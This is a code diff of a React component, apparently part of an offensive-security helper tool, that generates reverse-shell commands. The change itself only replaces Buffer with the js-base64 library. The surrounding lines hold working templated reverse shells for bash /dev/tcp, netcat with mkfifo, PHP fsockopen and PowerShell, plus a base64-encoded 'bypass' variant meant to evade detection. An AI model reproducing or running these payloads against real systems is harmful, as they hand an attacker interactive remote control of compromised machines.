@@ -5,6 +5,7 @@ import PersistedState from 'use-persisted-state';
 import QueueAnim from 'rc-queue-anim';
 import { Ipv4TcpCacheState } from 'components/types/Ipv4TcpCacheState';
 import Clipboard from 'react-clipboard.js';
+import Base64 from 'js-base64';
 
 const { Title, Paragraph, Text } = Typography;
 const IconFont = createFromIconfontCN( {
@@ -27,7 +28,7 @@ export default function ReverseShell () {
         message.success( 'Reverse shell URI encoded has been copied successfully !' );
     };
     const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${ values.ip }/${ values.port } <&1'`;
-    const bash_rshellByPass = `bash<<<$(base64 -d<<<`+Buffer.from(bash_rshell, 'binary').toString('base64')+`)`;
+    const bash_rshellByPass = `bash<<<$(base64 -d<<<`+Base64.encode(bash_rshell)+`)`;
     const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ values.ip } ${ values.port } >/tmp/f`;
     const php_rshell = `php -r '$sock=fsockopen(getenv("${ values.ip }"),getenv("${ values.port }"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
     const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ values.ip }',${ values.port });$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
